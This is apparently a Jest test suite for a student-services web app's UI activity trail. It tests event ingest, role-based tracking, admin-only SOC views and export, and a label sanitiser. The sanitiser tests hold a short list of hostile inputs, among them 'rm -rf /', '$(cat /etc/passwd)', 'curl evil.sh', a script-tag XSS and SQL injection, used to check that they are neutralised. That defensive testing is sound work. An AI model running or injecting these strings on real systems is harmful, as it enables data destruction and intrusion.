const request = require('supertest');
const fs = require('fs');
const path = require('path');
const { app } = require('../app');
const User = require('../models/User');
const UiActivity = require('../models/UiActivity');

let n = 0;
async function login(role) {
  const email = `ui-${role}-${Date.now()}-${n++}@example.com`;
  await request(app).post('/api/auth/register').send({ name: 'UI Test', email, password: 'TestPass123!' });
  await User.findOneAndUpdate({ email }, { emailVerified: true, role });
  const res = await request(app).post('/api/auth/login').send({ email, password: 'TestPass123!' });
  return { token: res.body.token, id: res.body.user.id, email };
}
const auth = (t) => ({ Authorization: `Bearer ${t}` });
const ev = (over = {}) => ({
  kind: 'click', page: '/admin/students', clientTime: new Date().toISOString(),
  element: { tag: 'button', label: 'Save changes' }, ...over,
});

describe('UI activity trail — ingest', () => {
  it('requires authentication', async () => {
    const res = await request(app).post('/api/ui-trail').send({ events: [ev()] });
    expect(res.status).toBe(401);
  });

  it('stores a tracked admin\'s events with identity, ip and sanitised fields', async () => {
    const { token, id, email } = await login('admin');
    const res = await request(app).post('/api/ui-trail').set(auth(token)).send({
      sessionKey: 'sess-1',
      events: [
        ev(),
        ev({ kind: 'file_select', element: { tag: 'input', type: 'file', label: 'Upload passport' }, files: [{ name: 'passport.pdf', size: 2048, type: 'application/pdf' }] }),
        ev({ kind: 'page_view', element: { tag: 'page', label: 'x'.repeat(500) } }),
        { kind: 'keystroke', page: '/x' },          // unknown kind -> dropped
        'garbage', null,                            // not objects -> dropped
        ev({ clientTime: '2001-01-01T00:00:00Z' }), // implausible client clock -> ignored
      ],
    });
    expect(res.status).toBe(200);
    expect(res.body).toEqual({ tracking: true, accepted: 4 });

    const rows = await UiActivity.find({ userId: id }).lean(); // events in one batch share a timestamp, so look up by content, not order
    expect(rows).toHaveLength(4);
    const click = rows.find((r) => r.kind === 'click' && !r.clientTime === false);
    expect(click).toMatchObject({ email, role: 'admin', page: '/admin/students', sessionKey: 'sess-1' });
    expect(click.element.label).toBe('Save changes');
    expect(click.ip).toBeTruthy();
    const pick = rows.find((r) => r.kind === 'file_select');
    expect(pick.files[0]).toMatchObject({ name: 'passport.pdf', size: 2048, type: 'application/pdf' });
    expect(rows.find((r) => r.kind === 'page_view').element.label.length).toBeLessThanOrEqual(120);
    expect(rows.filter((r) => r.clientTime === null)).toHaveLength(1); // the 2001 timestamp was ignored
  });

  it('caps a batch at 50 events and rejects a non-array body', async () => {
    const { token, id } = await login('counselor');
    const res = await request(app).post('/api/ui-trail').set(auth(token)).send({ events: Array.from({ length: 80 }, () => ev()) });
    expect(res.body.accepted).toBe(50);
    expect(await UiActivity.countDocuments({ userId: id })).toBe(50);
    const bad = await request(app).post('/api/ui-trail').set(auth(token)).send({ events: 'nope' });
    expect(bad.status).toBe(400);
  });

  it('does not record students by default and tells the client to stop', async () => {
    const { token, id } = await login('student');
    const res = await request(app).post('/api/ui-trail').set(auth(token)).send({ events: [ev()] });
    expect(res.body).toEqual({ tracking: false, accepted: 0 });
    expect(await UiActivity.countDocuments({ userId: id })).toBe(0);
  });

  it('records students only when explicitly enabled via SOC_UI_TRACK_ROLES', async () => {
    const { token, id } = await login('student');
    process.env.SOC_UI_TRACK_ROLES = 'admin,counselor,student';
    try {
      const res = await request(app).post('/api/ui-trail').set(auth(token)).send({ events: [ev()] });
      expect(res.body.tracking).toBe(true);
      expect(await UiActivity.countDocuments({ userId: id })).toBe(1);
    } finally {
      delete process.env.SOC_UI_TRACK_ROLES;
    }
  });

  it('is not blocked by the WAF for ordinary button labels', async () => {
    const { token } = await login('admin');
    const res = await request(app).post('/api/ui-trail').set(auth(token)).send({
      events: [ev({ element: { tag: 'button', label: 'Select university and Drop file' } })],
    });
    expect(res.status).toBe(200);
  });
});

describe('UI activity trail — SOC read side', () => {
  it('lists, filters and exports activity; admin-only', async () => {
    const admin = await login('admin');
    const tag = `Unique-${Date.now()}`;
    await request(app).post('/api/ui-trail').set(auth(admin.token)).send({
      events: [ev({ element: { tag: 'button', label: `Approve ${tag}` }, page: '/admin/applications' }), ev({ kind: 'page_view', page: '/admin/chat' })],
    });

    let res = await request(app).get('/api/soc/ui-activity').query({ q: tag }).set(auth(admin.token));
    expect(res.status).toBe(200);
    expect(res.body.activity).toHaveLength(1);
    expect(res.body.activity[0].element.label).toContain(tag);
    expect(res.body.trackedRoles).toContain('admin');

    res = await request(app).get('/api/soc/ui-activity').query({ email: admin.email, kind: 'page_view' }).set(auth(admin.token));
    expect(res.body.activity.every((r) => r.kind === 'page_view' && r.email === admin.email)).toBe(true);

    const csv = await request(app).get('/api/soc/ui-activity/export.csv').query({ q: tag }).set(auth(admin.token));
    expect(csv.status).toBe(200);
    expect(csv.text).toContain(tag);

    const counselor = await login('counselor');
    expect((await request(app).get('/api/soc/ui-activity').set(auth(counselor.token))).status).toBe(403);
  });

  it('shows a user\'s clicks in the Investigate timeline', async () => {
    const admin = await login('admin');
    const target = await login('counselor');
    await request(app).post('/api/ui-trail').set(auth(target.token)).send({
      events: [ev({ element: { tag: 'a', label: 'Open student record' }, page: '/counselor/students' })],
    });
    const res = await request(app).get(`/api/soc/investigate/user/${target.id}`).set(auth(admin.token));
    const row = res.body.timeline.find((t) => t.source === 'ui');
    expect(row).toBeTruthy();
    expect(row.title).toContain('Open student record');
    expect(row.detail).toContain('/counselor/students');
  });
});

describe('route → source file mapping (parsed from the real App.tsx)', () => {
  it('finds the file that renders each kind of route, including nested and splat routes', async () => {
    const { parseRouteFiles, findRouteFile } = await import('../../src/lib/routeFiles.ts');
    const source = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'App.tsx'), 'utf8');
    const routes = parseRouteFiles(source);
    expect(routes.length).toBeGreaterThan(40);
    const file = (p) => findRouteFile(routes, p)?.file;

    expect(file('/')).toBe('src/pages/Home.tsx');
    expect(file('/login')).toBe('src/pages/Login.tsx');
    expect(file('/admin')).toBe('src/pages/admin/AdminDashboard.tsx');
    expect(file('/admin/settings')).toBe('src/pages/admin/AdminSettings.tsx');
    expect(file('/admin/students/abc123')).toBe('src/pages/admin/AdminStudents.tsx'); // students/* splat
    expect(file('/admin/counselors/42/performance')).toBe('src/pages/admin/AdminCounselorPerformance.tsx');
    expect(file('/student/applications')).toBe('src/pages/student/StudentApplications.tsx');
    expect(file('/university/xyz/course/9')).toBe('src/pages/CourseDetail.tsx');
    expect(file('/soc')).toBe('src/pages/soc/SOCDashboard.tsx');
    expect(file('/definitely/not/a/route')).toBeUndefined();
  });
});

describe('tracker label sanitising (client code, run against the real WAF)', () => {
  it('turns attack-looking button text into something the WAF accepts, and masks long numbers', async () => {
    const { sanitizeLabel } = await import('../../src/lib/activityTracker.ts');
    const hostile = [
      '<script>alert(1)</script>', 'x; rm -rf /', '$(cat /etc/passwd)', 'a || curl evil.sh', "1 OR 1=1 -- ", 'onerror=alert(1)',
      'Save & Continue', 'Passport 12345678901 verified',
    ];
    const cleaned = hostile.map((h) => sanitizeLabel(h));
    expect(cleaned.join(' ')).not.toMatch(/[<>$;|=]/);
    expect(sanitizeLabel('Save & Continue')).toBe('Save and Continue');
    expect(sanitizeLabel('Passport 12345678901 verified')).toBe('Passport •••• verified');
    expect(sanitizeLabel('Émile’s Café — Résumé')).toContain('Café');   // non-ASCII letters survive
    expect(sanitizeLabel('x'.repeat(300)).length).toBe(80);

    const { token } = await login('admin');
    const res = await request(app).post('/api/ui-trail').set(auth(token)).send({
      events: cleaned.map((label) => ev({ element: { tag: 'button', label } })),
    });
    expect(res.status).toBe(200);
    expect(res.body.accepted).toBe(hostile.length);
  });
});
